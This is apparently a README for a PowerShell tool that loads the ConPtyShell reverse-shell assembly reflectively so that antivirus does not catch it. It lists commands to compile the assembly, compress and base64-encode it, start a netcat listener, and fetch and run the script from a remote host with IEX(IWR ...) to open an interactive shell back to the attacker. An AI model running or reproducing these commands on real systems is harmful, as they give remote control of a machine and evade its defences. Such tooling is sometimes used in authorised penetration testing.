# ConPtyReflect

Loads [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) assembly reflectively for AV evasion.

To make it work, I obtained the source and compiled it in `Developer PowerShell for VS 2022`:

```console
PS D:\Expt\ConPty> iwr https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.cs -o ConPtyShell.cs
PS D:\Expt\ConPty> csc.exe .\ConPtyShell.cs
```

Then I gzipped and base64 encoded the assembly:

```console
PS D:\Expt\ConPty> $fileBytes = [System.IO.File]::ReadAllBytes("D:\Expt\ConPty\ConPtyShell.exe")
PS D:\Expt\ConPty> $memoryStream = New-Object IO.MemoryStream
PS D:\Expt\ConPty> $gzipStream = New-Object IO.Compression.GzipStream($memoryStream, [IO.Compression.CompressionMode]::Compress)
PS D:\Expt\ConPty> $gzipStream.Write($fileBytes, 0, $fileBytes.Length)
PS D:\Expt\ConPty> $gzipStream.Close()
PS D:\Expt\ConPty> $base64String = [Convert]::ToBase64String($memoryStream.ToArray())
PS D:\Expt\ConPty> $base64String | Out-File "D:\Expt\ConPty\ConPtyShell.txt"
```

The script `ConPtyReflect.ps1` decodes this `ConPtyShell.txt` and loads it through reflection.

## Usage

Start a listener with:

```shell
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Invoke `ConPtyReflect.ps1`:

```shell
IEX(IWR http://10.xx.xx.xx:8000/ConPtyReflect.ps1 -UseBasicParsing)
Invoke-ConPtyReflect 10.xx.xx.xx 3001
```

## References

- [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
